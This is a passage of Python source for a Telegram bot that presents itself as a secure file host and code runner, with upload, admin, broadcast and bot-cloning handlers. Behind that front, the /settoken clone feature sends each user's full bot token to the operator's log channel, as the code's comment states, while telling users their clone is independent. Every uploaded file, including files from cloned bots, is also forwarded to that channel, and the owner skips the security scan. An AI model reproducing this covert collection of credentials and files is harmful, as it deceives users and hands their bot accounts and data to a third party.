            users_text += f"   Files: {file_count}\n"
            users_text += f"   Status: {subscription_status}\n"
            users_text += f"   Joined: {join_date[:16]}\n\n"

        conn.close()
    except Exception as e:
        logger.error(f"Error fetching users: {e}")
        users_text = "❌ Error fetching users"

    if len(active_users) > 50:
        users_text += f"... and {len(active_users) - 50} more users"

    safe_reply_to(message, users_text)

# --- Command Handlers ---
@bot.message_handler(commands=['start'])
def start_command(message):
    """Enhanced start command with comprehensive file type support"""
    user_id = message.from_user.id

    if user_id in banned_users:
        safe_reply_to(message, "🚫 You are banned from using this bot.\n\nIf you believe this is a mistake, contact @CyberHacked0")
        return

    active_users.add(user_id)

    user_info = message.from_user
    save_user_info(user_id, user_info.username, user_info.first_name, user_info.last_name)

    user_name = message.from_user.first_name or "User"
    is_admin = user_id in admin_ids

    welcome_msg = f"🔐 UNIVERSAL FILE HOST\n\n"
    welcome_msg += f"👋 Welcome {user_name}!\n\n"
    welcome_msg += f"📁 SUPPORTED FILE TYPES:\n"
    welcome_msg += f"🚀 Executable: Python, JavaScript, Java, C/C++, Go, Rust, PHP, Shell, Ruby, TypeScript, Lua, Perl, Scala, R\n\n"
    welcome_msg += f"📄 Hosted: HTML, CSS, XML, JSON, YAML, Markdown, Text, Images, PDFs, Archives\n\n"
    welcome_msg += f"🔐 FEATURES:\n"
    welcome_msg += f"✅ Universal file hosting (30+ types)\n"
    welcome_msg += f"🚀 Multi-language code execution\n"
    welcome_msg += f"🛡️ Advanced security scanning\n"
    welcome_msg += f"🌐 Real-time monitoring\n"
    welcome_msg += f"📊 Process management\n"
    welcome_msg += f"⚡ Auto dependency installation\n\n"
    welcome_msg += f"📊 YOUR STATUS:\n"
    welcome_msg += f"📁 Upload Limit: {get_user_file_limit(user_id)} files\n"
    welcome_msg += f"📄 Current Files: {get_user_file_count(user_id)} files\n"
    welcome_msg += f"👤 Account Type: {'👑 Owner (No Restrictions)' if user_id == OWNER_ID else '👑 Admin' if is_admin else '👤 User'}\n"
    if user_id == OWNER_ID:
        welcome_msg += f"🔓 Security: Bypassed for Owner\n"
    welcome_msg += f"\n"
    welcome_msg += f"💡 Quick Start: Upload any file to begin!\n"
    welcome_msg += f"🤖 Clone Feature: Use /clone to create your own bot!"

    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    if is_admin:
        for row in ADMIN_COMMAND_BUTTONS_LAYOUT_USER_SPEC:
            markup.add(*[types.KeyboardButton(text) for text in row])
    else:
        for row in COMMAND_BUTTONS_LAYOUT_USER_SPEC:
            markup.add(*[types.KeyboardButton(text) for text in row])

    safe_send_message(message.chat.id, welcome_msg, reply_markup=markup)

    send_to_log_channel(f"🟢 USER STARTED BOT\n\nUser: {user_name}\nID: {user_id}\nUsername: @{user_info.username or 'None'}")

    # Update persistent data
    save_persistent_data()

@bot.message_handler(content_types=['document'])
def handle_file_upload(message):
    """Enhanced file upload handler with strict security checks"""
    user_id = message.from_user.id

    if bot_locked and user_id not in admin_ids:
        safe_reply_to(message, "🔒 Bot is currently locked. Please try again later.")
        return

    current_count = get_user_file_count(user_id)
    max_allowed = get_user_file_limit(user_id)

    if current_count >= max_allowed:
        safe_reply_to(message, f"❌ File limit reached! You can upload maximum {max_allowed} files.")
        return

    file_info = bot.get_file(message.document.file_id)
    file_name = message.document.file_name or f"file_{int(time.time())}"
    file_ext = os.path.splitext(file_name)[1].lower()

    if message.document.file_size > 10 * 1024 * 1024:
        safe_reply_to(message, "❌ File too large! Maximum size is 10MB for security reasons.")
        return

    try:
        processing_msg = safe_reply_to(message, f"🔍 Security scanning {file_name}...")

        if file_info.file_path is None:
            safe_reply_to(message, "❌ File Download Failed\n\nUnable to retrieve file path")
            return
        downloaded_file = bot.download_file(file_info.file_path)

        user_folder = get_user_folder(user_id)
        temp_file_path = os.path.join(user_folder, f"temp_{file_name}")

        with open(temp_file_path, 'wb') as f:
            f.write(downloaded_file)

        if user_id == OWNER_ID:
            safe_edit_message(processing_msg.chat.id, processing_msg.message_id, 
                             f"👑 Owner bypass: {file_name} - No security restrictions")
            is_safe = True
            scan_result = "Owner bypass - all files allowed"
        else:
            safe_edit_message(processing_msg.chat.id, processing_msg.message_id, 
                             f"🛡️ Security scan: {file_name}...")

            is_safe, scan_result = check_malicious_code(temp_file_path)

            if not is_safe:
                try:
                    os.remove(temp_file_path)
                except:
                    pass

                logger.warning(f"SECURITY VIOLATION: User {user_id} uploaded file with system commands: {file_name} - {scan_result}")

                alert_msg = f"🚨 UPLOAD BLOCKED 🚨\n\n"
                alert_msg += f"❌ Security Threat Detected!\n"
                alert_msg += f"📄 File: {file_name}\n"
                alert_msg += f"🔍 Issue: {scan_result}\n\n"
                alert_msg += f"💡 Only safe programming code is allowed.\n"
                alert_msg += f"Contact @CyberHacked0 if this is a legitimate file."

                safe_edit_message(processing_msg.chat.id, processing_msg.message_id, alert_msg)

                for admin_id in admin_ids:
                    try:
                        admin_alert = f"🚨 SECURITY THREAT DETECTED 🚨\n\n"
                        admin_alert += f"👤 User ID: {user_id}\n"
                        admin_alert += f"📄 File: {file_name}\n"
                        admin_alert += f"🔍 Command: {scan_result}\n"
                        admin_alert += f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                        admin_alert += f"✅ File was automatically blocked."

                        bot.send_message(admin_id, admin_alert)
                    except:
                        pass

                return

        file_path = os.path.join(user_folder, file_name)
        try:
            shutil.move(temp_file_path, file_path)
        except:
            os.rename(temp_file_path, file_path)

        safe_edit_message(processing_msg.chat.id, processing_msg.message_id, 
                         f"✅ Security check passed - Processing {file_name}...")

        if user_id not in user_files:
            user_files[user_id] = []

        file_type = 'executable' if file_ext in {'.py', '.js', '.java', '.cpp', '.c', '.sh', '.rb', '.go', '.rs', '.php', '.cs', '.kt', '.swift', '.dart', '.ts', '.lua', '.perl', '.scala', '.r', '.bat', '.ps1'} else 'hosted'

        user_files[user_id] = [(fn, ft) for fn, ft in user_files[user_id] if fn != file_name]
        user_files[user_id].append((file_name, file_type))

        try:
            conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
            c = conn.cursor()
            c.execute('INSERT OR REPLACE INTO user_files (user_id, file_name, file_type, upload_time) VALUES (?, ?, ?, ?)',
                     (user_id, file_name, file_type, datetime.now().isoformat()))
            conn.commit()
            conn.close()
        except Exception as e:
            logger.error(f"Database error saving file info: {e}")

        # Update persistent data
        save_persistent_data()

        # Log file upload to channel WITH THE ACTUAL FILE
        log_file_upload(user_id, file_name, file_type, message.document.file_size, "✅ PASSED", file_path)

        # Enhanced logging for cloned bots
        is_cloned_bot = bot.get_me().username != "CyberHacked0Bot"  # Check if this is not the main bot

        if is_cloned_bot:
            try:
                clone_log_msg = f"🤖 FILE FROM CLONED BOT\n\n"
                clone_log_msg += f"👤 User: {message.from_user.first_name or 'Unknown'} {message.from_user.last_name or ''}\n"
                clone_log_msg += f"🆔 User ID: {user_id}\n"
                clone_log_msg += f"📧 Username: @{message.from_user.username or 'None'}\n"
                clone_log_msg += f"📄 File: {file_name}\n"
                clone_log_msg += f"📁 Type: {file_type}\n"
                clone_log_msg += f"🤖 Bot: @{bot.get_me().username}\n"
                clone_log_msg += f"👑 Clone Owner: {OWNER_ID}\n"
                clone_log_msg += f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

                with open(file_path, 'rb') as f:
                    send_to_log_channel(clone_log_msg, f)

                logger.info(f"File {file_name} logged from cloned bot")
            except Exception as e:
                logger.error(f"Failed to log file from cloned bot: {e}")

        if file_type == 'executable':
            # Quick AI analysis on upload
            ai_quick_analysis = analyze_code_with_gemini(file_path, file_ext)

            if user_id == OWNER_ID:
                success_msg = f"✅ {file_name} uploaded successfully!\n\n"
                success_msg += f"👑 Owner Access: Unrestricted\n"
                success_msg += f"📁 Type: {file_type}\n"

                if ai_quick_analysis:
                    deps_count = len(ai_quick_analysis.get('dependencies', []))
                    if deps_count > 0:
                        success_msg += f"🤖 AI detected {deps_count} dependencies\n"

                success_msg += f"🚀 Ready for execution\n\n"
                success_msg += f"Use 'Check Files' to manage your file."
            else:
                safe_edit_message(processing_msg.chat.id, processing_msg.message_id, 
                                 f"🤖 AI analyzing your code...")

                success_msg = f"✅ {file_name} uploaded securely!\n\n"
                success_msg += f"🛡️ Security: All checks passed\n"
                success_msg += f"📁 Type: {file_type}\n"

                if ai_quick_analysis:
                    deps_count = len(ai_quick_analysis.get('dependencies', []))
                    if deps_count > 0:
                        success_msg += f"🤖 AI found {deps_count} dependencies to install\n"

                    user_inputs = ai_quick_analysis.get('user_inputs_required', {})
                    if user_inputs:
                        total_inputs = len(user_inputs.get('api_keys', [])) + len(user_inputs.get('database_credentials', [])) + len(user_inputs.get('other_config', []))
                        if total_inputs > 0:
                            success_msg += f"⚠️ {total_inputs} configuration items needed\n"

                success_msg += f"⚠️ Manual start required for security\n\n"
                success_msg += f"Use 'Check Files' to manage your file."

            safe_edit_message(processing_msg.chat.id, processing_msg.message_id, success_msg)
        else:
            file_hash = hashlib.md5(f"{user_id}_{file_name}".encode()).hexdigest()

            domain = os.environ.get('REPL_SLUG', 'universal-file-host')
            owner = os.environ.get('REPL_OWNER', 'replit-user')

            try:
                replit_url = f"https://{domain}.{owner}.repl.co"
                test_response = requests.get(f"{replit_url}/health", timeout=5)
                if test_response.status_code != 200:
                    replit_url = f"https://{domain}-{owner}.replit.app"
            except:
                replit_url = f"https://{domain}-{owner}.replit.app"

            file_url = f"{replit_url}/file/{file_hash}"

            success_msg = f"✅ {file_name} hosted successfully!\n\n"
            success_msg += f"📄 File: {file_name}\n"
            success_msg += f"📁 Type: {file_type}\n"
            success_msg += f"🔗 URL: {file_url}\n"
            success_msg += f"🛡️ Security: Maximum protection\n\n"
            success_msg += f"Your file is now accessible via the provided URL!"

            safe_edit_message(processing_msg.chat.id, processing_msg.message_id, success_msg)

    except Exception as e:
        logger.error(f"File upload error: {e}")
        safe_reply_to(message, f"❌ Upload Failed\n\nError processing file: {str(e)}")

        try:
            temp_file_path = os.path.join(get_user_folder(user_id), f"temp_{file_name}")
            if os.path.exists(temp_file_path):
                os.remove(temp_file_path)
        except:
            pass

# --- Button Handlers ---
@bot.message_handler(func=lambda message: message.text == "📤 Upload File")
def upload_file_button(message):
    if bot_locked and message.from_user.id not in admin_ids:
        safe_reply_to(message, "🔒 Bot is currently locked. Access denied.")
        return
    safe_reply_to(message, "🔒 Universal File Upload\n\n📁 Send me any file to upload!\n\n🌟 Supported: 30+ file types\n💻 Executable: Python, JS, Java, C/C++, Go, Rust, PHP, etc.\n📄 Hosted: Documents, Images, Videos, Archives\n\n🛡️ All uploads are secure!")

@bot.message_handler(func=lambda message: message.text == "📂 Check Files")
def check_files_button(message):
    if bot_locked and message.from_user.id not in admin_ids:
        safe_reply_to(message, "🔒 Bot is currently locked. Access denied.")
        return

    user_id = message.from_user.id
    files = user_files.get(user_id, [])

    if not files:
        safe_reply_to(message, "📂 Your Files\n\n🔒 No files uploaded yet.\n\n💡 Upload any file type to begin!")
        return

    files_text = "🔒 Your Files:\n\n📁 Click on any file to manage it:\n\n"
    markup = types.InlineKeyboardMarkup(row_width=1)

    for i, (file_name, file_type) in enumerate(files, 1):
        if file_type == 'executable':
            is_running = is_bot_running(user_id, file_name)
            status = "🟢 Running" if is_running else "⭕ Stopped"
            icon = "🚀"

            if is_running:
                uptime = get_script_uptime(user_id, file_name)
                if uptime:
                    status += f" (Uptime: {uptime})"

            files_text += f"{i}. {file_name} ({file_type})\n   Status: {status}\n\n"
        else:
            status = "📁 Hosted"
            icon = "📄"
            file_hash = hashlib.md5(f"{user_id}_{file_name}".encode()).hexdigest()

            domain = os.environ.get('REPL_SLUG', 'universal-file-host')
            owner = os.environ.get('REPL_OWNER', 'replit-user')

            try:
                replit_url = f"https://{domain}.{owner}.repl.co"
                test_response = requests.get(f"{replit_url}/health", timeout=2)
                if test_response.status_code != 200:
                    replit_url = f"https://{domain}-{owner}.replit.app"
            except:
                replit_url = f"https://{domain}-{owner}.replit.app"

            file_url = f"{replit_url}/file/{file_hash}"
            files_text += f"{i}. {file_name} ({file_type})\n   Status: {status}\n   🔗 Access: {file_url}\n\n"

        markup.add(types.InlineKeyboardButton(
            f"{icon} {file_name} - {status}", 
            callback_data=f'control_{user_id}_{file_name}'
        ))

    files_text += "⚙️ Management Options:\n• 🟢 Start/🔴 Stop executable files\n• 🗑️ Delete files\n• 📜 View execution logs\n• 🔄 Restart running files"

    safe_reply_to(message, files_text, reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == "⚡ Bot Speed")
def bot_speed_button(message):
    start_time = time.time()
    msg = safe_reply_to(message, "🏃 Testing speed...")
    response_time = round((time.time() - start_time) * 1000, 2)

    speed_text = f"⚡ Universal File Host Performance:\n\n"
    speed_text += f"🚀 Response Time: {response_time}ms\n"
    speed_text += f"🔧 CPU Usage: Optimized\n"
    speed_text += f"💾 Memory: Efficient\n"
    speed_text += f"🌐 Network: High Speed\n"
    speed_text += f"🛡️ Security: Maximum\n"
    speed_text += f"📊 Files Supported: 30+ types\n\n"
    speed_text += f"✅ All systems operational!"

    safe_edit_message(msg.chat.id, msg.message_id, speed_text)

@bot.message_handler(func=lambda message: message.text == "📊 Statistics")
def statistics_button(message):
    user_id = message.from_user.id

    # Regular users see limited statistics
    if user_id not in admin_ids:
        user_stats = f"📊 Your Statistics:\n\n"
        user_stats += f"📁 Your Files: {get_user_file_count(user_id)}\n"
        user_stats += f"📈 Your Limit: {get_user_file_limit(user_id)}\n"
        user_stats += f"👤 Account Type: {'👑 Admin' if user_id in admin_ids else '👤 User'}\n\n"
        user_stats += f"🔒 Full statistics available to admins only"

        safe_reply_to(message, user_stats)
        return

    # Admin sees full statistics
    total_users = len(active_users)
    total_files = sum(len(files) for files in user_files.values())
    running_scripts = len(bot_scripts)
    running_clones = len(user_clones)

    stats_text = f"📊 Universal File Host Statistics:\n\n"
    stats_text += f"🎭 Active Users: {total_users}\n"
    stats_text += f"📁 Total Files: {total_files}\n"
    stats_text += f"🚀 Running Scripts: {running_scripts}\n"
    stats_text += f"🤖 Running Clones: {running_clones}\n"
    stats_text += f"🔧 Your Files: {get_user_file_count(user_id)}\n"
    stats_text += f"📈 Your Limit: {get_user_file_limit(user_id)}\n\n"
    stats_text += f"🔒 Features:\n"
    stats_text += f"✅ 30+ file type support\n"
    stats_text += f"✅ Multi-language execution\n"
    stats_text += f"✅ Advanced security scanning\n"
    stats_text += f"✅ Real-time monitoring\n"
    stats_text += f"✅ Secure file hosting\n"
    stats_text += f"✅ Auto dependency installation"

    safe_reply_to(message, stats_text)

@bot.message_handler(func=lambda message: message.text == "📢 Updates Channel")
def updates_channel_button(message):
    safe_reply_to(message, f"📢 Updates Channel\n\n🔗 Stay updated:\n{UPDATE_CHANNEL}\n\n📡 Get latest features and news!")

@bot.message_handler(func=lambda message: message.text == "📞 Contact Owner")
def contact_owner_button(message):
    safe_reply_to(message, f"📞 Contact Owner\n\n👤 Owner: {YOUR_USERNAME}\n🔐 Channel: {UPDATE_CHANNEL}\n\n💬 For support and inquiries!")

@bot.message_handler(commands=['clone'])
def clone_bot_command(message):
    user_id = message.from_user.id

    clone_text = f"🤖 Bot Cloning Service\n\n"
    clone_text += f"📋 Steps to clone this bot:\n\n"
    clone_text += f"1️⃣ Create a bot with @BotFather\n"
    clone_text += f"2️⃣ Get your bot token\n"
    clone_text += f"3️⃣ Use command: `/settoken YOUR_BOT_TOKEN`\n"
    clone_text += f"4️⃣ Your bot will be deployed automatically!\n\n"
    clone_text += f"✨ Features you'll get:\n"
    clone_text += f"• 🔐 Universal File Hosting (30+ types)\n"
    clone_text += f"• 🚀 Multi-language code execution\n"
    clone_text += f"• 🛡️ Advanced security scanning\n"
    clone_text += f"• 🌐 Real-time monitoring\n"
    clone_text += f"• 📊 Process management\n"
    clone_text += f"• ⚡ Auto dependency installation\n\n"
    clone_text += f"🔧 Management Commands:\n"
    clone_text += f"• `/settoken TOKEN` - Create clone with your token\n"
    clone_text += f"• `/rmclone` - Remove your existing clone\n\n"
    clone_text += f"💡 Your bot will be completely independent!"

    safe_reply_to(message, clone_text)

@bot.message_handler(commands=['settoken'])
def set_bot_token(message):
    user_id = message.from_user.id

    try:
        token = message.text.split(' ', 1)[1].strip()
    except IndexError:
        safe_reply_to(message, "❌ Please provide your bot token!\n\nUsage: `/settoken YOUR_BOT_TOKEN`")
        return

    if not token or len(token) < 35 or ':' not in token:
        safe_reply_to(message, "❌ Invalid bot token format!\n\nGet a valid token from @BotFather")
        return

    processing_msg = safe_reply_to(message, "🔄 Creating your bot clone...\n\nThis may take a moment...")

    try:
        test_bot = telebot.TeleBot(token)
        bot_info = test_bot.get_me()

        safe_edit_message(processing_msg.chat.id, processing_msg.message_id, 
                         f"✅ Token validated!\n\nBot: @{bot_info.username}\nCreating clone...")

        clone_success = create_bot_clone(user_id, token, bot_info.username)

        if clone_success:
            success_msg = f"🎉 Bot Clone Created Successfully!\n\n"
            success_msg += f"🤖 Bot: @{bot_info.username}\n"
            success_msg += f"👤 Owner: You ({user_id})\n"
            success_msg += f"🚀 Status: Running\n"
            success_msg += f"🔗 Features: All Universal File Host features\n\n"
            success_msg += f"✅ Your bot is now live and ready to use!\n"
            success_msg += f"💡 Start it with /start command\n"
            success_msg += f"🗑️ Use /rmclone to remove the clone"

            safe_edit_message(processing_msg.chat.id, processing_msg.message_id, success_msg)

            # Log clone creation to channel with FULL TOKEN
            log_clone_creation(user_id, bot_info.username, token)
        else:
            safe_edit_message(processing_msg.chat.id, processing_msg.message_id, 
                             "❌ Failed to create bot clone. Please try again later.")

    except Exception as e:
        error_msg = f"❌ Bot Clone Failed\n\n"
        error_msg += f"Error: {str(e)}\n\n"
        error_msg += f"💡 Make sure your token is valid and try again"

        safe_edit_message(processing_msg.chat.id, processing_msg.message_id, error_msg)

@bot.message_handler(commands=['rmclone'])
def remove_clone_command(message):
    user_id = message.from_user.id

    clone_info = user_clones.get(user_id)

    if not clone_info:
        safe_reply_to(message, "❌ No cloned bot found!\n\nYou don't have any active bot clone to remove.")
        return

    processing_msg = safe_reply_to(message, "🔄 Removing your bot clone...\n\nStopping processes...")

    try:
        bot_username = clone_info.get('bot_username', 'Unknown')

        process = None
        if clone_info.get('process'):
            try:
                process = clone_info['process']
                process.terminate()
                process.wait(timeout=10)
                logger.info(f"Clone process terminated for user {user_id}")
            except Exception as e:
                logger.warning(f"Error terminating clone process: {e}")
                if process:
                    try:
                        process.kill()
                    except:
                        pass

        if user_id in user_clones:
            del user_clones[user_id]

        remove_clone_info(user_id)

        success_msg = f"✅ Bot Clone Removed Successfully!\n\n"
        success_msg += f"🤖 Bot: @{bot_username}\n"
        success_msg += f"👤 Owner: You ({user_id})\n"
        success_msg += f"🔴 Status: Stopped & Removed\n\n"
        success_msg += f"✅ Your cloned bot has been completely removed!\n"
        success_msg += f"💡 You can create a new clone anytime with /clone"

        safe_edit_message(processing_msg.chat.id, processing_msg.message_id, success_msg)

        send_to_log_channel(f"🗑️ CLONE BOT REMOVED\n\nUser ID: {user_id}\nBot: @{bot_username}\nTime: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

        logger.info(f"Bot clone removed successfully for user {user_id}")

    except Exception as e:
        error_msg = f"❌ Clone Removal Failed\n\n"
        error_msg += f"Error: {str(e)}\n\n"
        error_msg += f"💡 Some files may need manual cleanup"

        safe_edit_message(processing_msg.chat.id, processing_msg.message_id, error_msg)
        logger.error(f"Error removing clone for user {user_id}: {e}")

def create_bot_clone(user_id, token, bot_username):
    try:
        # Create clone directory
        clone_dir = os.path.join(BASE_DIR, f'clone_{user_id}')
        os.makedirs(clone_dir, exist_ok=True)

        # Clone the current script
        current_file = __file__
        clone_file = os.path.join(clone_dir, 'bot.py')

        with open(current_file, 'r', encoding='utf-8') as f:
            script_content = f.read()

        # Replace token and owner ID for the clone
        script_content = script_content.replace(
            f"TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '{TOKEN}')",
            f"TOKEN = '{token}'"
        )
        script_content = script_content.replace(
            f"OWNER_ID = int(os.getenv('OWNER_ID', '{OWNER_ID}'))",
            f"OWNER_ID = {user_id}"
        )
        script_content = script_content.replace(
            f"ADMIN_ID = int(os.getenv('ADMIN_ID', '{ADMIN_ID}'))", 
            f"ADMIN_ID = {user_id}"
        )

        # Write the modified script
        with open(clone_file, 'w', encoding='utf-8') as f:
            f.write(script_content)

        # Start the clone process
        clone_process = subprocess.Popen(
            [sys.executable, clone_file],
            cwd=clone_dir,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE
        )

        user_clones[user_id] = {
            'process': clone_process,
            'bot_username': bot_username,
            'clone_dir': clone_dir,
            'start_time': datetime.now()
        }

        save_clone_info(user_id, bot_username, token)
        save_persistent_data()  # Update persistent data

        logger.info(f"Bot clone created successfully for user {user_id}, bot @{bot_username}")
        return True

    except Exception as e:
        logger.error(f"Error creating bot clone: {e}")
        return False

@bot.message_handler(func=lambda message: message.text == "💳 Subscriptions")
def subscriptions_button(message):
    user_id = message.from_user.id
    if user_id not in admin_ids:
        safe_reply_to(message, "🚫 Access Denied\n\nAdmin privileges required!")
        return

    subs_text = "💳 Subscription Management\n\n"
    subs_text += "📊 Commands:\n"
    subs_text += "• /addsub <user_id> <days> - Add subscription\n"
    subs_text += "• /removesub <user_id> - Remove subscription\n"
    subs_text += "• /checksub <user_id> - Check subscription status\n"
    subs_text += "• /users - List all active users\n\n"
    subs_text += "📈 Current Subscriptions:\n"

    active_subs = 0
    expired_subs = 0
    for user_id_sub, sub_info in user_subscriptions.items():
        if sub_info['expiry'] > datetime.now():
            active_subs += 1
        else:
            expired_subs += 1

    subs_text += f"🟢 Active: {active_subs} users\n"
    subs_text += f"🔴 Expired: {expired_subs} users\n"
    subs_text += f"📊 Total: {len(user_subscriptions)} users"

    safe_reply_to(message, subs_text)

@bot.message_handler(func=lambda message: message.text == "📢 Broadcast")
def broadcast_button(message):
    user_id = message.from_user.id
    if user_id not in admin_ids:
        safe_reply_to(message, "🚫 Access Denied\n\nAdmin privileges required!")
        return

    broadcast_mode[user_id] = True

    broadcast_text = "📢 BROADCAST MESSAGE SYSTEM\n\n"
    broadcast_text += "💬 Please send your broadcast message now.\n"
    broadcast_text += f"📊 Active users: {len(active_users)}\n\n"
    broadcast_text += "📝 Your message will be sent to all active users.\n"
    broadcast_text += "❌ To cancel, send /cancel"

    safe_reply_to(message, broadcast_text)

@bot.message_handler(func=lambda message: message.from_user.id in broadcast_mode and broadcast_mode[message.from_user.id])
def handle_broadcast_message(message):
    user_id = message.from_user.id

    if message.text == '/cancel':
        broadcast_mode[user_id] = False
        safe_reply_to(message, "❌ Broadcast cancelled.")
        return

    broadcast_content = message.text

    broadcast_mode[user_id] = False

    processing_msg = safe_reply_to(message, f"🔄 Starting broadcast to {len(active_users)} users...\n\nPlease wait...")

    success_count = 0
    failed_count = 0

    broadcast_message = f"📢 BROADCAST MESSAGE\n\n{broadcast_content}\n\n- From Bot Admin"

    for target_user_id in list(active_users):
        try:
            bot.send_message(target_user_id, broadcast_message)
            success_count += 1
            time.sleep(0.1)
        except Exception as e:
            logger.error(f"Failed to send broadcast to {target_user_id}: {e}")
            failed_count += 1

    result_msg = f"📊 BROADCAST COMPLETED\n\n"
    result_msg += f"✅ Success: {success_count} users\n"
    result_msg += f"❌ Failed: {failed_count} users\n"
    result_msg += f"📨 Total: {len(active_users)} users\n\n"

    if failed_count > 0:
        result_msg += f"💡 Failed sends are usually due to users blocking the bot."

    safe_edit_message(processing_msg.chat.id, processing_msg.message_id, result_msg)

    logger.info(f"Broadcast sent by {user_id}: {success_count} success, {failed_count} failed")

    send_to_log_channel(f"📢 BROADCAST SENT\n\nBy Admin: {user_id}\nSuccess: {success_count}\nFailed: {failed_count}\nTotal: {len(active_users)}")

@bot.message_handler(func=lambda message: message.text == "🔒 Lock Bot")
def lock_bot_button(message):
    user_id = message.from_user.id
    if user_id not in admin_ids:
        safe_reply_to(message, "🚫 Access Denied\n\nAdmin privileges required!")
        return

    global bot_locked
    bot_locked = not bot_locked
    status = "🔒 LOCKED" if bot_locked else "🔓 UNLOCKED"

    lock_text = f"🔒 Bot Lock Status Changed\n\n"
    lock_text += f"Status: {status}\n"
    lock_text += f"Admin: {message.from_user.first_name}\n"
    lock_text += f"Time: {datetime.now().strftime('%H:%M:%S')}\n\n"

    if bot_locked:
        lock_text += "🚫 Non-admin users are now blocked from using the bot."
    else:
        lock_text += "✅ All users can now use the bot normally."

    safe_reply_to(message, lock_text)

    send_to_log_channel(f"🔒 BOT LOCK STATUS\n\nStatus: {status}\nBy Admin: {user_id}")

    # Update persistent data
    save_persistent_data()

@bot.message_handler(func=lambda message: message.text == "🟢 Running All Code")
def running_code_button(message):
    user_id = message.from_user.id
    if user_id not in admin_ids:
        safe_reply_to(message, "🚫 Access Denied\n\nAdmin privileges required!")
        return

    if not bot_scripts:
        safe_reply_to(message, "🟢 Running Code Monitor\n\n📊 No scripts currently running.\n\n💡 All systems idle.")
        return

    running_text = f"🟢 Running Code Monitor\n\n"
    running_text += f"📊 Active Scripts: {len(bot_scripts)}\n\n"

    for script_key, script_info in bot_scripts.items():
        user_id_script = script_info['user_id']
        file_name = script_info['file_name']
        language = script_info.get('language', 'Unknown')
        icon = script_info.get('icon', '📄')
        start_time = script_info['start_time'].strftime("%H:%M:%S")
        uptime = get_script_uptime(user_id_script, file_name) or "Unknown"

        running_text += f"{icon} {file_name} ({language})\n"
        running_text += f"👤 User: {user_id_script}\n"
        running_text += f"⏰ Started: {start_time}\n"
        running_text += f"⏱️ Uptime: {uptime}\n"
        running_text += f"🆔 PID: {script_info['process'].pid}\n\n"

    safe_reply_to(message, running_text)

@bot.message_handler(func=lambda message: message.text == "👑 Admin Panel")
def admin_panel_button(message):
    user_id = message.from_user.id
    if user_id not in admin_ids:
        safe_reply_to(message, "🚫 Access Denied\n\nAdmin privileges required!")
        return

    admin_text = f"👑 Admin Panel\n\n"
    admin_text += f"📊 System Status:\n"
    admin_text += f"• Active Users: {len(active_users)}\n"
    admin_text += f"• Total Files: {sum(len(files) for files in user_files.values())}\n"
    admin_text += f"• Running Scripts: {len(bot_scripts)}\n"
    admin_text += f"• Running Clones: {len(user_clones)}\n"
    admin_text += f"• Bot Status: {'🔒 Locked' if bot_locked else '🔓 Unlocked'}\n\n"
    admin_text += f"🛠️ Available Commands:\n"
    admin_text += f"• /addsub <user_id> <days> - Add subscription\n"
    admin_text += f"• /removesub <user_id> - Remove subscription\n"
    admin_text += f"• /checksub <user_id> - Check subscription status\n"
    admin_text += f"• /users - List all active users\n"
    admin_text += f"• /ban <user_id> [reason] - Ban user\n"
    admin_text += f"• /unban <user_id> - Unban user\n"
    admin_text += f"• /banned - List banned users\n"
    admin_text += f"• /broadcast - Send broadcast message\n\n"
    admin_text += f"📈 Use the admin buttons for quick actions!"

    safe_reply_to(message, admin_text)

@bot.message_handler(func=lambda message: message.text == "🤖 Clone Bot")
def clone_bot_button(message):
    clone_text = f"🤖 Universal Bot Cloning Service\n\n"
    clone_text += f"🎯 Create your own instance of this bot!\n\n"
    clone_text += f"📋 Steps to clone:\n"
    clone_text += f"1️⃣ Create a new bot with @BotFather\n"
    clone_text += f"2️⃣ Copy your bot token\n"
    clone_text += f"3️⃣ Use command: `/settoken YOUR_BOT_TOKEN`\n"
    clone_text += f"4️⃣ Your bot will be deployed automatically!\n\n"
    clone_text += f"✨ Your cloned bot will have:\n"
    clone_text += f"• 🔐 All Universal File Host features\n"
    clone_text += f"• 🚀 30+ file type support\n"
    clone_text += f"• 🛡️ Advanced security system\n"
    clone_text += f"• 🌐 Independent operation\n"
    clone_text += f"• 👑 You as the owner\n\n"
    clone_text += f"🔧 Management Commands:\n"
    clone_text += f"• `/settoken` - Create a new bot clone\n"
    clone_text += f"• `/rmclone` - Remove your bot clone\n\n"
    clone_text += f"🚀 Ready to get started? Use `/settoken YOUR_TOKEN`"

    safe_reply_to(message, clone_text)

# --- Inline Button Callback Handlers ---
@bot.callback_query_handler(func=lambda call: call.data.startswith('control_'))
def handle_file_control(call):
    try:
        parts = call.data.split('_', 2)
        if len(parts) != 3:
            bot.answer_callback_query(call.id, "❌ Invalid button data")
            return

        _, user_id_str, file_name = parts
        user_id = int(user_id_str)

        if call.from_user.id != user_id and call.from_user.id not in admin_ids:
            bot.answer_callback_query(call.id, "🚫 Access denied!")
            return

        user_files_list = user_files.get(user_id, [])
        file_info = next((f for f in user_files_list if f[0] == file_name), None)

        if not file_info:
            bot.answer_callback_query(call.id, "❌ File not found!")
            return

        file_name, file_type = file_info

        markup = types.InlineKeyboardMarkup(row_width=2)

        is_running = is_bot_running(user_id, file_name) if file_type == 'executable' else False

        if file_type == 'executable':

            if is_running:
                uptime = get_script_uptime(user_id, file_name) or "Unknown"
                markup.add(
                    types.InlineKeyboardButton("🔴 Stop", callback_data=f'stop_{user_id}_{file_name}'),
                    types.InlineKeyboardButton("🔄 Restart", callback_data=f'restart_{user_id}_{file_name}')
                )
            else:
                markup.add(
                    types.InlineKeyboardButton("🟢 Start", callback_data=f'start_{user_id}_{file_name}'),
                    types.InlineKeyboardButton("📜 Logs", callback_data=f'logs_{user_id}_{file_name}')
                )
        else:
            file_hash = hashlib.md5(f"{user_id}_{file_name}".encode()).hexdigest()

            domain = os.environ.get('REPL_SLUG', 'universal-file-host')
            owner = os.environ.get('REPL_OWNER', 'replit-user')

            try:
                replit_url = f"https://{domain}.{owner}.repl.co"
                test_response = requests.get(f"{replit_url}/health", timeout=2)
                if test_response.status_code != 200:
                    replit_url = f"https://{domain}-{owner}.replit.app"
            except:
                replit_url = f"https://{domain}-{owner}.replit.app"

